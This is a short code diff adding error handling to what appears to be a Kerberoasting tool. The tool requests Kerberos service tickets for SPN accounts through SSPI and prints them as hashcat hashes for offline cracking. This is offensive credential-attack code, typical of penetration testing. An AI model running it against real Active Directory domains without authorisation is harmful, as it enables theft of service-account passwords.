@@ -139,6 +139,7 @@ def run():
 		spn_users = []
 		asrep_users = []
 		results = []
+		errors = []
 		for user in ldap.get_all_knoreq_user_objects():
 			cred = KerberosCredential()
 			cred.username = user.sAMAccountName
@@ -162,7 +163,11 @@ def run():
 			if spn_name[:6] == 'krbtgt':
 				continue
 			ksspi = KerberoastSSPI()
-			ticket = ksspi.get_ticket_for_spn(spn_name)
+			try:
+				ticket = ksspi.get_ticket_for_spn(spn_name)
+			except Exception as e:
+				errors.append((spn_name, e))
+				continue
 			results.append(TGSTicket2hashcat(ticket))
 			
 		if args.out_file:
@@ -172,6 +177,9 @@ def run():
 		else:
 			for thash in results:
 				print(thash)
+				
+		for err in errors:
+			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
 		
 	
 	elif args.command == 'spnroast-sspi':
@@ -224,9 +232,14 @@ def run():
 				targets.append(spn_name)
 		
 		results = []
+		errors = []
 		for spn_name in targets:
 			ksspi = KerberoastSSPI()
-			ticket = ksspi.get_ticket_for_spn(spn_name)
+			try:
+				ticket = ksspi.get_ticket_for_spn(spn_name)
+			except Exception as e:
+				errors.append((spn_name, e))
+				continue
 			results.append(TGSTicket2hashcat(ticket))
 			
 		if args.out_file:
@@ -237,6 +250,9 @@ def run():
 		else:
 			for thash in results:
 				print(thash)
+		
+		for err in errors:
+			print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))
 
 		logging.info('SSPI based Kerberoast complete')
 		
